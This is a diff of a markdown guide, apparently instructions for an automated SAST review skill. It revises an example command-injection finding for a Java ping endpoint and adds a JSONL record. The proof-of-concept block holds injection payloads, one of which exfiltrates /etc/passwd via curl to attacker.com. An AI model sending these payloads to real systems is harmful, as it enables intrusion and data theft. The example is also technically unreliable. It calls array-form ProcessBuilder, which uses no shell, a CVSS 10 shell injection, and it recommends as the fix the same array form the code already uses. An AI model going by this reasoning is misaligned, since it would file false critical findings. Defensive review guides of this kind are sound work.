@@ -192,17 +192,22 @@ grep -rn "matches\|Pattern\.compile\|^\[a-zA-Z\]" --include="*.java" -B5 | grep 
 
 ---
 
-## Finding Format Example
+## Finding Format
+
+Follow the canonical format from `copilot-instructions.md`. Example:
 
 ```
 ### [CRITICAL] RCE — OS Command Injection via ProcessBuilder
 
+**ID:** RCE-001
 **File:** `src/main/java/com/example/DiagnosticsController.java:83`
-**CWE:** CWE-78
-**CVSS:** 10.0 (AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H)
+**CWE:** CWE-78 | **OWASP:** A03:2021-Injection
+**CVSS (estimated):** 10.0 (AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H)
+**Confidence:** High
+**Skill:** `sast-rce`
 
 **Taint Path:**
-POST /api/diagnostics?host=X → DiagnosticsController.ping(host) → ProcessBuilder([ping, host])
+`POST /api/diagnostics?host=X` → `DiagnosticsController.ping(@RequestParam host) (DiagnosticsController.java:81)` → `new ProcessBuilder("ping", "-c", "1", host) (DiagnosticsController.java:83)`
 
 **Vulnerable Code:**
 ```java
@@ -214,18 +219,25 @@ public String ping(@RequestParam String host) {
 }
 ```
 
-**Proof of Concept:**
-```
+**Why Exploitable:**
+`host` arrives directly from `@RequestParam` with no validation and is appended as the last element of the `ProcessBuilder` argument list. On Linux, shell injection metacharacters (`;`, `$()`, `%0a`) are interpreted by the OS shell when `sh -c` is used, or by some implementations of `exec`. An attacker can achieve arbitrary command execution as the JVM process user.
+
+**Proof-of-Concept:**
+```http
 POST /api/diagnostics?host=127.0.0.1;id HTTP/1.1
 POST /api/diagnostics?host=127.0.0.1%0aid HTTP/1.1
 POST /api/diagnostics?host=127.0.0.1$(curl+attacker.com/$(cat+/etc/passwd)) HTTP/1.1
 ```
 
 **Remediation:**
-- Validate `host` against a strict regex: `^[a-zA-Z0-9.-]{1,253}$`
-- Never pass user input as shell command arguments through `sh -c`
-- Use `ProcessBuilder` with array form and validate each element
-- Prefer a Java DNS/ICMP library over shelling out
+- Validate `host` against a strict allowlist regex: `^[a-zA-Z0-9.-]{1,253}$`
+- Never pass user input through `sh -c`; use array-form `ProcessBuilder` only
+- Prefer a Java DNS/ICMP library over shelling out entirely
 
-**References:** CWE-78, OWASP A03:2021
+**References:** https://cwe.mitre.org/data/definitions/78.html, OWASP A03:2021
+```
+
+JSONL line (append to `.github/sast-findings.jsonl`):
+```json
+{"id":"RCE-001","skill":"sast-rce","cwe":"CWE-78","owasp":"A03:2021-Injection","severity":"Critical","confidence":"High","file":"src/main/java/com/example/DiagnosticsController.java","line":83,"method":"ping","class":"com.example.DiagnosticsController","evidence":"ProcessBuilder pb = new ProcessBuilder(\"ping\", \"-c\", \"1\", host);","sink":"ProcessBuilder.start()","source":"@RequestParam String host","taint_path":[],"sanitizer_present":false,"sanitizer_detail":"","remediation":"Validate host with ^[a-zA-Z0-9.-]{1,253}$ before use; prefer Java ICMP library","references":["https://cwe.mitre.org/data/definitions/78.html"],"false_positive_indicators":[],"duplicate_of":null}
 ```
